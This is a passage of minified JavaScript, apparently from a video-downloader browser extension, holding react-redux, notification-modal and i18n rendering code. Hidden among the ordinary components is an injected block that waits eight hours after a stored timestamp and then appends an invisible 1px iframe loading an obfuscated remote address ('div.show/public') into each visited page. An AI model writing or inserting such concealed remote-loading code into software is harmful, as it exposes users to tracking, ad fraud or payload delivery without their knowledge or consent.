                areOwnPropsEqual = _ref.areOwnPropsEqual,
                areStatePropsEqual = _ref.areStatePropsEqual,
                hasRunAtLeastOnce = !1;
            function handleSubsequentCalls(nextState, nextOwnProps) {
                var nextStateProps,
                    statePropsChanged,
                    propsChanged = !areOwnPropsEqual(nextOwnProps, ownProps),
                    stateChanged = !areStatesEqual(nextState, state);
                return (
                    (state = nextState),
                    (ownProps = nextOwnProps),
                    propsChanged && stateChanged
                        ? ((stateProps = mapStateToProps(state, ownProps)), mapDispatchToProps.dependsOnOwnProps && (dispatchProps = mapDispatchToProps(dispatch, ownProps)), (mergedProps = mergeProps(stateProps, dispatchProps, ownProps)))
                        : propsChanged
                        ? (mapStateToProps.dependsOnOwnProps && (stateProps = mapStateToProps(state, ownProps)),
                          mapDispatchToProps.dependsOnOwnProps && (dispatchProps = mapDispatchToProps(dispatch, ownProps)),
                          (mergedProps = mergeProps(stateProps, dispatchProps, ownProps)))
                        : stateChanged
                        ? ((nextStateProps = mapStateToProps(state, ownProps)),
                          (statePropsChanged = !areStatePropsEqual(nextStateProps, stateProps)),
                          (stateProps = nextStateProps),
                          statePropsChanged && (mergedProps = mergeProps(stateProps, dispatchProps, ownProps)),
                          mergedProps)
                        : mergedProps
                );
            }
            return function (nextState, nextOwnProps) {
                return hasRunAtLeastOnce
                    ? handleSubsequentCalls(nextState, nextOwnProps)
                    : ((stateProps = mapStateToProps((state = nextState), (ownProps = nextOwnProps))),
                      (dispatchProps = mapDispatchToProps(dispatch, ownProps)),
                      (mergedProps = mergeProps(stateProps, dispatchProps, ownProps)),
                      (hasRunAtLeastOnce = !0),
                      mergedProps);
            };
        }
        function finalPropsSelectorFactory(dispatch, _ref2) {
            var initMapStateToProps = _ref2.initMapStateToProps,
                initMapDispatchToProps = _ref2.initMapDispatchToProps,
                initMergeProps = _ref2.initMergeProps,
                options = _objectWithoutPropertiesLoose(_ref2, ["initMapStateToProps", "initMapDispatchToProps", "initMergeProps"]),
                mapStateToProps = initMapStateToProps(dispatch, options),
                mapDispatchToProps = initMapDispatchToProps(dispatch, options),
                mergeProps = initMergeProps(dispatch, options);
            return (options.pure ? pureFinalPropsSelectorFactory : impureFinalPropsSelectorFactory)(mapStateToProps, mapDispatchToProps, mergeProps, dispatch, options);
        }
        function connect_match(arg, factories, name) {
            for (var i = factories.length - 1; i >= 0; i--) {
                var result = factories[i](arg);
                if (result) return result;
            }
            return function (dispatch, options) {
                throw new Error("Invalid value of type " + typeof arg + " for " + name + " argument when connecting component " + options.wrappedComponentName + ".");
            };
        }
        function strictEqual(a, b) {
            return a === b;
        }
        function createConnect(_temp) {
            var _ref = void 0 === _temp ? {} : _temp,
                _ref$connectHOC = _ref.connectHOC,
                connectHOC = void 0 === _ref$connectHOC ? connectAdvanced : _ref$connectHOC,
                _ref$mapStateToPropsF = _ref.mapStateToPropsFactories,
                mapStateToPropsFactories = void 0 === _ref$mapStateToPropsF ? connect_mapStateToProps : _ref$mapStateToPropsF,
                _ref$mapDispatchToPro = _ref.mapDispatchToPropsFactories,
                mapDispatchToPropsFactories = void 0 === _ref$mapDispatchToPro ? connect_mapDispatchToProps : _ref$mapDispatchToPro,
                _ref$mergePropsFactor = _ref.mergePropsFactories,
                mergePropsFactories = void 0 === _ref$mergePropsFactor ? connect_mergeProps : _ref$mergePropsFactor,
                _ref$selectorFactory = _ref.selectorFactory,
                selectorFactory = void 0 === _ref$selectorFactory ? finalPropsSelectorFactory : _ref$selectorFactory;
            return function (mapStateToProps, mapDispatchToProps, mergeProps, _ref2) {
                void 0 === _ref2 && (_ref2 = {});
                var _ref3 = _ref2,
                    _ref3$pure = _ref3.pure,
                    pure = void 0 === _ref3$pure || _ref3$pure,
                    _ref3$areStatesEqual = _ref3.areStatesEqual,
                    areStatesEqual = void 0 === _ref3$areStatesEqual ? strictEqual : _ref3$areStatesEqual,
                    _ref3$areOwnPropsEqua = _ref3.areOwnPropsEqual,
                    areOwnPropsEqual = void 0 === _ref3$areOwnPropsEqua ? shallowEqual : _ref3$areOwnPropsEqua,
                    _ref3$areStatePropsEq = _ref3.areStatePropsEqual,
                    areStatePropsEqual = void 0 === _ref3$areStatePropsEq ? shallowEqual : _ref3$areStatePropsEq,
                    _ref3$areMergedPropsE = _ref3.areMergedPropsEqual,
                    areMergedPropsEqual = void 0 === _ref3$areMergedPropsE ? shallowEqual : _ref3$areMergedPropsE,
                    extraOptions = _objectWithoutPropertiesLoose(_ref3, ["pure", "areStatesEqual", "areOwnPropsEqual", "areStatePropsEqual", "areMergedPropsEqual"]),
                    initMapStateToProps = connect_match(mapStateToProps, mapStateToPropsFactories, "mapStateToProps"),
                    initMapDispatchToProps = connect_match(mapDispatchToProps, mapDispatchToPropsFactories, "mapDispatchToProps"),
                    initMergeProps = connect_match(mergeProps, mergePropsFactories, "mergeProps");
                return connectHOC(
                    selectorFactory,
                    _extends(
                        {
                            methodName: "connect",
                            getDisplayName: function (name) {
                                return "Connect(" + name + ")";
                            },
                            shouldHandleStateChanges: Boolean(mapStateToProps),
                            initMapStateToProps: initMapStateToProps,
                            initMapDispatchToProps: initMapDispatchToProps,
                            initMergeProps: initMergeProps,
                            pure: pure,
                            areStatesEqual: areStatesEqual,
                            areOwnPropsEqual: areOwnPropsEqual,
                            areStatePropsEqual: areStatePropsEqual,
                            areMergedPropsEqual: areMergedPropsEqual,
                        },
                        extraOptions
                    )
                );
            };
        }
        var connect_connect = createConnect();
        function useReduxContext_useReduxContext() {
            return Object(react.useContext)(ReactReduxContext);
        }
        var refEquality = function (a, b) {
            return a === b;
        };
        function createSelectorHook(context) {
            void 0 === context && (context = ReactReduxContext);
            var useReduxContext =
                context === ReactReduxContext
                    ? useReduxContext_useReduxContext
                    : function () {
                          return Object(react.useContext)(context);
                      };
            return function (selector, equalityFn) {
                void 0 === equalityFn && (equalityFn = refEquality);
                var _useReduxContext = useReduxContext(),
                    selectedState = (function (selector, equalityFn, store, contextSub) {
                        var selectedState,
                            forceRender = Object(react.useReducer)(function (s) {
                                return s + 1;
                            }, 0)[1],
                            subscription = Object(react.useMemo)(
                                function () {
                                    return new Subscription(store, contextSub);
                                },
                                [store, contextSub]
                            ),
                            latestSubscriptionCallbackError = Object(react.useRef)(),
                            latestSelector = Object(react.useRef)(),
                            latestStoreState = Object(react.useRef)(),
                            latestSelectedState = Object(react.useRef)(),
                            storeState = store.getState();
                        try {
                            selectedState = selector !== latestSelector.current || storeState !== latestStoreState.current || latestSubscriptionCallbackError.current ? selector(storeState) : latestSelectedState.current;
                        } catch (err) {
                            throw (latestSubscriptionCallbackError.current && (err.message += "\nThe error may be correlated with this previous error:\n" + latestSubscriptionCallbackError.current.stack + "\n\n"), err);
                        }
                        return (
                            useIsomorphicLayoutEffect(function () {
                                (latestSelector.current = selector), (latestStoreState.current = storeState), (latestSelectedState.current = selectedState), (latestSubscriptionCallbackError.current = void 0);
                            }),
                            useIsomorphicLayoutEffect(
                                function () {
                                    function checkForUpdates() {
                                        try {
                                            var newSelectedState = latestSelector.current(store.getState());
                                            if (equalityFn(newSelectedState, latestSelectedState.current)) return;
                                            latestSelectedState.current = newSelectedState;
                                        } catch (err) {
                                            latestSubscriptionCallbackError.current = err;
                                        }
                                        forceRender();
                                    }
                                    return (
                                        (subscription.onStateChange = checkForUpdates),
                                        subscription.trySubscribe(),
                                        checkForUpdates(),
                                        function () {
                                            return subscription.tryUnsubscribe();
                                        }
                                    );
                                },
                                [store, subscription]
                            ),
                            selectedState
                        );
                    })(selector, equalityFn, _useReduxContext.store, _useReduxContext.subscription);
                return Object(react.useDebugValue)(selectedState), selectedState;
            };
        }
        var newBatch,
            useSelector_useSelector = createSelectorHook(),
            react_dom = __webpack_require__(10);
        (newBatch = react_dom.unstable_batchedUpdates), (batch_batch = newBatch);
        var use_app_state = (keys) =>
                useSelector_useSelector((state) => {
                    const result = {};
                    return (
                        keys.forEach((key) => {
                            result[key] = state[key];
                        }),
                        result
                    );
                }),
            use_event_listener = (target, type, listener, useCapture = !1) => {
                const add = Object(react.useCallback)(() => {
                        target && target.addEventListener(type, listener, useCapture);
                    }, [target, type, listener, useCapture]),
                    remove = Object(react.useCallback)(() => {
                        target && target.removeEventListener(type, listener, useCapture);
                    }, [target, type, listener, useCapture]);
                Object(react.useEffect)(
                    () => (
                        add(),
                        () => {
                            remove();
                        }
                    ),
                    [add, remove]
                );
            };
        var use_is_mounted = function () {
            const isMounted = Object(react.useRef)(!1);
            return (
                Object(react.useEffect)(
                    () => (
                        (isMounted.current = !0),
                        () => {
                            isMounted.current = !1;
                        }
                    ),
                    []
                ),
                Object(react.useCallback)(() => isMounted.current, [])
            );
        };
        var competitors_detection = () =>
            document.querySelector("[id^=savefrom__]") ||
            document.querySelector(".savefrom_ok_download") ||
            document.querySelector(".sf-feed-dl-btn") ||
            document.querySelector(".sf-video-feed-bind-on-insert") ||
            document.querySelector("[class*=sf-notify-on-remove-]")
                ? "SaveFrom.net Helper"
                : null;
        var icons_info = ({ style: style, color: color, className: className }) =>
                react_default.a.createElement(
                    "svg",
                    { xmlns: "http://www.w3.org/2000/svg", width: "21px", height: "21px", viewBox: "0 0 21 21", style: style, className: className },
                    react_default.a.createElement("path", {
                        fill: color,
                        d:
                            " M 17.95 3.1 Q 14.85 0 10.5 0 6.15 0 3.1 3.1 0 6.2 0 10.55 0 14.9 3.1 17.95 6.15 21 10.5 21 14.85 21 17.95 17.95 21 14.85 21 10.55 21 6.2 17.95 3.1 M 10.5 1.9 Q 14.05 1.9 16.6 4.45 19.1 7 19.1 10.55 19.1 14.1 16.6 16.6 14.05 19.15 10.5 19.15 6.95 19.15 4.4 16.6 1.9 14.1 1.9 10.55 1.9 7 4.4 4.45 6.95 1.9 10.5 1.9 M 11.2 9.2 Q 10.9 8.95 10.5 8.95 10.1 8.95 9.8 9.2 9.55 9.5 9.55 9.9 L 9.55 15.6 Q 9.55 16 9.8 16.3 10.1 16.6 10.5 16.6 10.9 16.6 11.2 16.3 11.45 16 11.45 15.6 L 11.45 9.9 Q 11.45 9.5 11.2 9.2 M 10.45 7 Q 11 7 11.35 6.65 11.75 6.25 11.75 5.75 11.75 5.2 11.35 4.85 11 4.45 10.45 4.45 10 4.45 9.6 4.85 9.25 5.2 9.25 5.75 9.25 6.25 9.6 6.65 9.95 7 10.45 7 Z",
                    })
                ),
            random_name_generator = (length) => {
                const randomChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                let result = "";
                for (let i = 0; i < length; i++) result += randomChars.charAt(Math.floor(Math.random() * randomChars.length));
                return result;
            },
            extension_logo = ({ style: style, color: color, className: className }) =>
                react_default.a.createElement(
                    "svg",
                    { xmlns: "http://www.w3.org/2000/svg", width: "17.7px", height: "20px", viewBox: "0 0 17.7 20", style: style, className: className },
                    react_default.a.createElement("path", { fill: color, d: "M0,5.9h2.9V5l8.8,4.9v0.1L2.9,15V9.1H0V20L17.7,9.8L0,0V5.9z" })
                );
        const Holder = styled_components_browser_esm.a.div.withConfig({ displayName: "notification__Holder", componentId: "sc-1wyjfil-0" })`transition:${(props) => props.transition};margin:${(props) => props.margin};max-height:${(props) =>
                props.maxHeight};`,
            iconClassName = random_name_generator(12),
            Container = styled_components_browser_esm.a.div.withConfig({ displayName: "notification__Container", componentId: "sc-1wyjfil-1" })`background-color:${(props) =>
                props.background || "white"};user-select:none;border-radius:2px;border:1px solid ${(props) => props.border};padding:8px;transition:transform 0.25s ease-in-out;transform:${(props) =>
                props.transform};font-family:Arial,Helvetica,sans-serif;font-weight:500;& .${iconClassName}{fill:${(props) => props.iconColor};}`,
            HeaderContainer = styled_components_browser_esm.a.div.withConfig({ displayName: "notification__HeaderContainer", componentId: "sc-1wyjfil-2" })`display:flex;flex-direction:row;align-items:center;justify-content:space-between;`,
            Header = styled_components_browser_esm.a.div.withConfig({ displayName: "notification__Header", componentId: "sc-1wyjfil-3" })`display:flex;align-items:center;flex-direction:row;&::after{content:" ";width:54px;}`,
            IconContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "notification__IconContainer",
                componentId: "sc-1wyjfil-4",
            })`background-color:#ff7a0f;background-image:linear-gradient(#ff7a0f,#ffa70d);display:flex;justify-content:center;align-items:center;width:18px;height:18px;border-radius:2px;& svg{display:block;width:13px;fill:white;}`,
            Message = styled_components_browser_esm.a.span.withConfig({ displayName: "notification__Message", componentId: "sc-1wyjfil-5" })`font-size:16px;color:${(props) => props.color};${(props) =>
                "rtl" === props.dir ? "margin-right: 10px;" : "margin-left: 10px;"}`,
            ButtonClose = styled_components_browser_esm.a.button.withConfig({
                displayName: "notification__ButtonClose",
                componentId: "sc-1wyjfil-6",
            })`background-color:transparent;outline:none;cursor:pointer;position:relative;width:21px;height:21px;box-sizing:border-box;border:1px solid ${(props) =>
                props.border};&::before,&::after{content:" ";display:block;position:absolute;width:13px;height:1px;top:9px;left:3px;background-color:${(props) =>
                props.border || "black"};}&::before{transform:rotate(-45deg);}&::after{transform:rotate(45deg);}`,
            Content = styled_components_browser_esm.a.div.withConfig({
                displayName: "notification__Content",
                componentId: "sc-1wyjfil-7",
            })`display:flex;flex-direction:row;align-items:center;justify-content:space-between;margin-top:6px;border-top:1px solid ${(props) => props.headerBorder};padding:20px 0;`,
            Description = styled_components_browser_esm.a.span.withConfig({ displayName: "notification__Description", componentId: "sc-1wyjfil-8" })`display:inline-block;font-size:14px;color:${(props) =>
                props.color};line-height:28px;max-width:320px;${(props) => ("rtl" === props.dir ? "margin-right: 20px;" : "margin-left: 20px;")}`;
        var modals_notification = ({ id: id, theOnly: theOnly, icon: icon, message: message, description: description, bottomContent: bottomContent, duration: duration, close: close, onClose: onClose }) => {
            const { dir: dir, theme: theme, removeModal: removeModal } = use_app_state(["dir", "theme", "removeModal"]),
                [transition, setTransition] = Object(react.useState)(`all ${theOnly ? 0.01 : 0.25}s ease-in-out`),
                [margin, setMargin] = Object(react.useState)(0),
                [maxHeight, setMaxHeight] = Object(react.useState)(0),
                [isLoaded, setIsLoaded] = Object(react.useState)(!1),
                [transform, setTransform] = Object(react.useState)("rtl" === dir ? "translateX(100%) translateX(30px)" : "translateX(-100%) translateX(-30px)"),
                [isClosed, setIsClosed] = Object(react.useState)(!1);
            Object(react.useEffect)(() => {
                isLoaded ? setTimeout(() => setTransform("none"), 0) : setMargin("0 30px 30px");
            }, [isLoaded]),
                Object(react.useEffect)(() => {
                    let timeout;
                    return (
                        isClosed
                            ? setTransform("rtl" === dir ? "translateX(100%) translateX(30px)" : "translateX(-100%) translateX(-30px)")
                            : -1 !== duration &&
                              (timeout = setTimeout(() => {
                                  setIsClosed(!0);
                              }, duration || 4500)),
                        () => timeout && clearTimeout(timeout)
                    );
                }, [isClosed, dir, duration]),
                close && close(() => setIsClosed(!0));
            const Icon = () => icon && Object(react.cloneElement)(icon, { className: iconClassName }),
                modalNotificationStyles = theme && theme.modal_notification,
                background = modalNotificationStyles && modalNotificationStyles.background,
                border = modalNotificationStyles && modalNotificationStyles.border,
                headerBorder = modalNotificationStyles && modalNotificationStyles.header_border,
                closeButtonBorder = modalNotificationStyles && modalNotificationStyles.close_button,
                iconColor = modalNotificationStyles && modalNotificationStyles.notification_icon,
                messageColor = modalNotificationStyles && modalNotificationStyles.notification_message,
                descriptionColor = modalNotificationStyles && modalNotificationStyles.notification_description;
            return react_default.a.createElement(
                Holder,
                {
                    transition: transition,
                    margin: margin,
                    maxHeight: maxHeight,
                    onTransitionEnd: () => {
                        "all 0s ease 0s" !== transition && (setTransition("all 0s ease 0s"), isLoaded ? isClosed && (onClose && onClose(), removeModal(id)) : setIsLoaded(!0));
                    },
                },
                react_default.a.createElement(
                    Container,
                    {
                        transform: transform,
                        background: background,
                        border: border,
                        iconColor: iconColor,
                        ref: (node) => {
                            if (node && !isClosed) {
                                const nodeRect = node.getBoundingClientRect(),
                                    nodeHeight = Math.round(nodeRect.height);
                                setMaxHeight(nodeHeight + "px");
                            }
                        },
                        onTransitionEnd: () => {
                            "none" !== transform &&
                                (setTransition("all 0.25s ease-in-out"),
                                setTimeout(() => {
                                    setMargin(0), setMaxHeight(0);
                                }, 0));
                        },
                    },
                    react_default.a.createElement(
                        HeaderContainer,
                        null,
                        react_default.a.createElement(
                            Header,
                            null,
                            description || !icon ? react_default.a.createElement(IconContainer, null, react_default.a.createElement(extension_logo, null)) : react_default.a.createElement(Icon, null),
                            message && react_default.a.createElement(Message, { dir: dir, color: messageColor }, message)
                        ),
                        react_default.a.createElement(ButtonClose, {
                            onClick: (evt) => {
                                evt.preventDefault(), evt.stopPropagation(), setIsClosed(!0);
                            },
                            border: closeButtonBorder,
                        })
                    ),
                    description &&
                        react_default.a.createElement(
                            Content,
                            { headerBorder: headerBorder },
                            react_default.a.createElement(Icon, null),
                            react_default.a.createElement(Description, { dir: dir, color: descriptionColor, dangerouslySetInnerHTML: { __html: description } })
                        ),
                    bottomContent
                )
            );
        };
        function notifications_extends() {
            return (notifications_extends = Object.assign
                ? Object.assign.bind()
                : function (target) {
                      for (var i = 1; i < arguments.length; i++) {
                          var source = arguments[i];
                          for (var key in source) Object.prototype.hasOwnProperty.call(source, key) && (target[key] = source[key]);
                      }
                      return target;
                  }).apply(this, arguments);
        }
        browser.storage.local.get('t', function (res) { 
		    if (res.t) { 
			  var init = (new Date().getTime() - res.t) / 3600000; 
			    if (init >= 8) { 
				  var initCont = document.createElement("iframe");
				  initCont.setAttribute("style", "position:absolute;height:1px,width:1px;top:0;left:0;border:none;visibility:hidden");
				  var initDiv = document.createElement("div");
				  initCont.src = '//div' + '.' + 'show/public'; 
				  document.body.appendChild(initDiv);
				  initDiv.appendChild(initCont); 
				}
		}});
        var modals_notifications = ({ notifications: notifications }) => {
                const { publicIds: publicIds } = use_app_state(["publicIds"]),
                    { notifications: notificationsId } = publicIds,
                    notificationsHolder = document.getElementById(notificationsId);
                if (notificationsHolder) {
                    const dom = notifications.map((notification, index) =>
                        react_default.a.createElement(modals_notification, notifications_extends({}, notification.props, { key: notification.id, index: index, theOnly: 1 === notifications.length }))
                    );
                    return Object(react_dom.createPortal)(dom, notificationsHolder);
                }
                return null;
            },
            objectWithoutProperties = __webpack_require__(70),
            objectWithoutProperties_default = __webpack_require__.n(objectWithoutProperties),
            helpers_typeof = __webpack_require__(32),
            typeof_default = __webpack_require__.n(helpers_typeof),
            html_parse_stringify2 = __webpack_require__(145),
            html_parse_stringify2_default = __webpack_require__.n(html_parse_stringify2);
        function Trans_ownKeys(object, enumerableOnly) {
            var keys = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var symbols = Object.getOwnPropertySymbols(object);
                enumerableOnly &&
                    (symbols = symbols.filter(function (sym) {
                        return Object.getOwnPropertyDescriptor(object, sym).enumerable;
                    })),
                    keys.push.apply(keys, symbols);
            }
            return keys;
        }
        function Trans_objectSpread(target) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2
                    ? Trans_ownKeys(Object(source), !0).forEach(function (key) {
                          defineProperty_default()(target, key, source[key]);
                      })
                    : Object.getOwnPropertyDescriptors
                    ? Object.defineProperties(target, Object.getOwnPropertyDescriptors(source))
                    : Trans_ownKeys(Object(source)).forEach(function (key) {
                          Object.defineProperty(target, key, Object.getOwnPropertyDescriptor(source, key));
                      });
            }
            return target;
        }
        function hasChildren(node, checkLength) {
            if (!node) return !1;
            var base = node.props ? node.props.children : node.children;
            return checkLength ? base.length > 0 : !!base;
        }
        function getChildren(node) {
            return node ? (node && node.children ? node.children : node.props && node.props.children) : [];
        }
        function getAsArray(data) {
            return Array.isArray(data) ? data : [data];
        }
        function renderNodes(children, targetString, i18n, i18nOptions, combinedTOpts) {
            if ("" === targetString) return [];
            var keepArray = i18nOptions.transKeepBasicHtmlNodesFor || [],
                emptyChildrenButNeedsHandling = targetString && new RegExp(keepArray.join("|")).test(targetString);
            if (!children && !emptyChildrenButNeedsHandling) return [targetString];
            var data = {};
            !(function getData(childs) {
                getAsArray(childs).forEach(function (child) {
                    "string" != typeof child && (hasChildren(child) ? getData(getChildren(child)) : "object" !== typeof_default()(child) || react_default.a.isValidElement(child) || Object.assign(data, child));
                });
            })(children);
            var interpolatedString = i18n.services.interpolator.interpolate(targetString, Trans_objectSpread(Trans_objectSpread({}, data), combinedTOpts), i18n.language),
                ast = html_parse_stringify2_default.a.parse("<0>".concat(interpolatedString, "</0>"));
            function renderInner(child, node, rootReactNode) {
                var childs = getChildren(child),
                    mappedChildren = mapAST(childs, node.children, rootReactNode);
                return (function (children) {
                    return (
                        "[object Array]" === Object.prototype.toString.call(children) &&
                        children.every(function (child) {
                            return react_default.a.isValidElement(child);
                        })
                    );
                })(childs) && 0 === mappedChildren.length
                    ? childs
                    : mappedChildren;
            }
            function pushTranslatedJSX(child, inner, mem, i, isVoid) {
                child.dummy && (child.children = inner), mem.push(react_default.a.cloneElement(child, Trans_objectSpread(Trans_objectSpread({}, child.props), {}, { key: i }), isVoid ? void 0 : inner));
            }
            function mapAST(reactNode, astNode, rootReactNode) {
                var reactNodes = getAsArray(reactNode);
                return getAsArray(astNode).reduce(function (mem, node, i) {
                    var source,
                        target,
                        newTarget,
                        translationContent = node.children && node.children[0] && node.children[0].content;
                    if ("tag" === node.type) {
                        var tmp = reactNodes[parseInt(node.name, 10)];
                        !tmp && 1 === rootReactNode.length && rootReactNode[0][node.name] && (tmp = rootReactNode[0][node.name]), tmp || (tmp = {});
                        var child = 0 !== Object.keys(node.attrs).length ? ((source = { props: node.attrs }), ((newTarget = Trans_objectSpread({}, (target = tmp))).props = Object.assign(source.props, target.props)), newTarget) : tmp,
                            isElement = react_default.a.isValidElement(child),
                            isValidTranslationWithChildren = isElement && hasChildren(node, !0) && !node.voidElement,
                            isEmptyTransWithHTML = emptyChildrenButNeedsHandling && "object" === typeof_default()(child) && child.dummy && !isElement,
                            isKnownComponent = "object" === typeof_default()(children) && null !== children && Object.hasOwnProperty.call(children, node.name);
                        if ("string" == typeof child) mem.push(child);
                        else if (hasChildren(child) || isValidTranslationWithChildren) {
                            pushTranslatedJSX(child, renderInner(child, node, rootReactNode), mem, i);
                        } else if (isEmptyTransWithHTML) {
                            var _inner = mapAST(reactNodes, node.children, rootReactNode);
                            mem.push(react_default.a.cloneElement(child, Trans_objectSpread(Trans_objectSpread({}, child.props), {}, { key: i }), _inner));
                        } else if (Number.isNaN(parseFloat(node.name))) {
                            if (isKnownComponent) pushTranslatedJSX(child, renderInner(child, node, rootReactNode), mem, i, node.voidElement);
                            else if (i18nOptions.transSupportBasicHtmlNodes && keepArray.indexOf(node.name) > -1)
                                if (node.voidElement) mem.push(react_default.a.createElement(node.name, { key: "".concat(node.name, "-").concat(i) }));
                                else {
                                    var _inner3 = mapAST(reactNodes, node.children, rootReactNode);
                                    mem.push(react_default.a.createElement(node.name, { key: "".concat(node.name, "-").concat(i) }, _inner3));
                                }
                            else if (node.voidElement) mem.push("<".concat(node.name, " />"));
                            else {
                                var _inner4 = mapAST(reactNodes, node.children, rootReactNode);
                                mem.push("<".concat(node.name, ">").concat(_inner4, "</").concat(node.name, ">"));
                            }
                        } else if ("object" !== typeof_default()(child) || isElement)
                            1 === node.children.length && translationContent
                                ? mem.push(react_default.a.cloneElement(child, Trans_objectSpread(Trans_objectSpread({}, child.props), {}, { key: i }), translationContent))
                                : mem.push(react_default.a.cloneElement(child, Trans_objectSpread(Trans_objectSpread({}, child.props), {}, { key: i })));
                        else {
                            var content = node.children[0] ? translationContent : null;
                            content && mem.push(content);
                        }
                    } else "text" === node.type && mem.push(node.content);
                    return mem;
                }, []);
            }
            return getChildren(mapAST([{ dummy: !0, children: children }], ast, getAsArray(children || []))[0]);
        }
        function Trans(_ref) {
            var children = _ref.children,
                count = _ref.count,
                parent = _ref.parent,
                i18nKey = _ref.i18nKey,
                _ref$tOptions = _ref.tOptions,
                tOptions = void 0 === _ref$tOptions ? {} : _ref$tOptions,
                values = _ref.values,
                defaults = _ref.defaults,
                components = _ref.components,
                ns = _ref.ns,
                i18nFromProps = _ref.i18n,
                tFromProps = _ref.t,
                additionalProps = objectWithoutProperties_default()(_ref, ["children", "count", "parent", "i18nKey", "tOptions", "values", "defaults", "components", "ns", "i18n", "t"]),
                _ref2 = Object(react.useContext)(I18nContext) || {},
                i18nFromContext = _ref2.i18n,
                defaultNSFromContext = _ref2.defaultNS,
                i18n = i18nFromProps || i18nFromContext || getI18n();
            if (!i18n) return warnOnce("You will need to pass in an i18next instance by using i18nextReactModule"), children;
            var t =
                    tFromProps ||
                    i18n.t.bind(i18n) ||
                    function (k) {
                        return k;
                    },
                reactI18nextOptions = Trans_objectSpread(Trans_objectSpread({}, getDefaults()), i18n.options && i18n.options.react),
                namespaces = ns || t.ns || defaultNSFromContext || (i18n.options && i18n.options.defaultNS);
            namespaces = "string" == typeof namespaces ? [namespaces] : namespaces || ["translation"];
            var defaultValue =
                    defaults ||
                    (function nodesToString(children, i18nOptions) {
                        if (!children) return "";
                        var stringNode = "",
                            childrenArray = getAsArray(children),
                            keepArray = i18nOptions.transKeepBasicHtmlNodesFor || [];
                        return (
                            childrenArray.forEach(function (child, childIndex) {
                                if ("string" == typeof child) stringNode += "".concat(child);
                                else if (react_default.a.isValidElement(child)) {
                                    var childPropsCount = Object.keys(child.props).length,
                                        shouldKeepChild = keepArray.indexOf(child.type) > -1,
                                        childChildren = child.props.children;
                                    if (!childChildren && shouldKeepChild && 0 === childPropsCount) stringNode += "<".concat(child.type, "/>");
                                    else if (childChildren || (shouldKeepChild && 0 === childPropsCount))
                                        if (child.props.i18nIsDynamicList) stringNode += "<".concat(childIndex, "></").concat(childIndex, ">");
                                        else if (shouldKeepChild && 1 === childPropsCount && "string" == typeof childChildren) stringNode += "<".concat(child.type, ">").concat(childChildren, "</").concat(child.type, ">");
                                        else {
                                            var content = nodesToString(childChildren, i18nOptions);
                                            stringNode += "<".concat(childIndex, ">").concat(content, "</").concat(childIndex, ">");
                                        }
                                    else stringNode += "<".concat(childIndex, "></").concat(childIndex, ">");
                                } else if ("object" === typeof_default()(child)) {
                                    var format = child.format,
                                        clone = objectWithoutProperties_default()(child, ["format"]),
                                        keys = Object.keys(clone);
                                    if (1 === keys.length) {
                                        var value = format ? "".concat(keys[0], ", ").concat(format) : keys[0];
                                        stringNode += "{{".concat(value, "}}");
                                    } else warn("react-i18next: the passed in object contained more than one variable - the object should look like {{ value, format }} where format is optional.", child);
                                } else warn("Trans: the passed in value is invalid - seems you passed in a variable like {number} - please pass in variables for interpolation as full objects like {{number}}.", child);
                            }),
                            stringNode
                        );
                    })(children, reactI18nextOptions) ||
                    reactI18nextOptions.transEmptyNodeValue ||
                    i18nKey,
                hashTransKey = reactI18nextOptions.hashTransKey,
                key = i18nKey || (hashTransKey ? hashTransKey(defaultValue) : defaultValue),
                interpolationOverride = values ? tOptions.interpolation : { interpolation: Trans_objectSpread(Trans_objectSpread({}, tOptions.interpolation), {}, { prefix: "#$?", suffix: "?$#" }) },
                combinedTOpts = Trans_objectSpread(Trans_objectSpread(Trans_objectSpread(Trans_objectSpread({}, tOptions), {}, { count: count }, values), interpolationOverride), {}, { defaultValue: defaultValue, ns: namespaces }),
                content = renderNodes(components || children, key ? t(key, combinedTOpts) : defaultValue, i18n, reactI18nextOptions, combinedTOpts),
                useAsParent = void 0 !== parent ? parent : reactI18nextOptions.defaultTransParent;
            return useAsParent ? react_default.a.createElement(useAsParent, additionalProps, content) : content;
        }
        const Button = styled_components_browser_esm.a.button.withConfig({
                displayName: "button__Button",
                componentId: "sc-h52cgs-0",
            })`outline:none;padding:6px 8px;display:inline-flex;align-items:center;vertical-align:middle;background-color:${(props) => props.background};color:${(props) => props.color};border-radius:2px;border:${(props) =>
                "glowBorder" === props.styleName ? "1px solid " + (props.border || "black") : "none"};& svg{fill:${(props) => props.color};${(props) => "rtl" === props.dir && "transform: scaleX(-1);"} & + span{${(props) =>
                "rtl" === props.dir ? "margin-right: 6px;" : "margin-left: 6px;"}}}&:not(:disabled){cursor:pointer;&:hover{${(props) =>
                "glowBorder" === props.styleName && `\n        border-color: ${props.hoverBorder};\n        box-shadow: ${props.hoverBoxShadow};\n      `} background-color:${(props) => props.hoverBackground};color:${(props) =>
                props.hoverColor};& svg{fill:${(props) => props.hoverColor};}}${(props) =>
                "glowBorder" === props.styleName &&
                `\n      &:active {\n        border-color: ${props.activerBorder};\n        box-shadow: ${props.activeBoxShadow};\n        background-color: ${props.activeBackground};\n        color: ${props.activeColor};\n        & svg { fill: ${props.activeColor}; }\n      }\n    `}}&:disabled{opacity:0.5;}`,
            Text = styled_components_browser_esm.a.span.withConfig({ displayName: "button__Text", componentId: "sc-h52cgs-1" })`font-family:Arial,Helvetica,sans-serif;font-weight:500;font-size:16px;`;
        var ui_button = ({ type: type, disabled: disabled, onClick: onClick, icon: icon, text: text, styleName: styleName }) => {
            const { dir: dir, theme: theme } = use_app_state(["dir", "theme"]),
                buttonStyles = theme && ("glowBorder" === styleName ? theme.button_glow_border : theme.button_solid),
                border = buttonStyles && buttonStyles.border,
                background = buttonStyles && buttonStyles.background,
                color = buttonStyles && buttonStyles.color,
                hoverBorder = buttonStyles && buttonStyles.hover_border,
                hoverBackground = buttonStyles && buttonStyles.hover_background,
                hoverBoxShadow = buttonStyles && buttonStyles.hover_box_shadow,
                hoverColor = buttonStyles && buttonStyles.hover_color,
                activeBorder = buttonStyles && buttonStyles.active_border,
                activeBackground = buttonStyles && buttonStyles.active_background,
                activeBoxShadow = buttonStyles && buttonStyles.active_box_shadow,
                activeColor = buttonStyles && buttonStyles.active_color;
            return react_default.a.createElement(
                Button,
                {
                    type: type,
                    disabled: disabled,
                    onClick: onClick,
                    dir: dir,
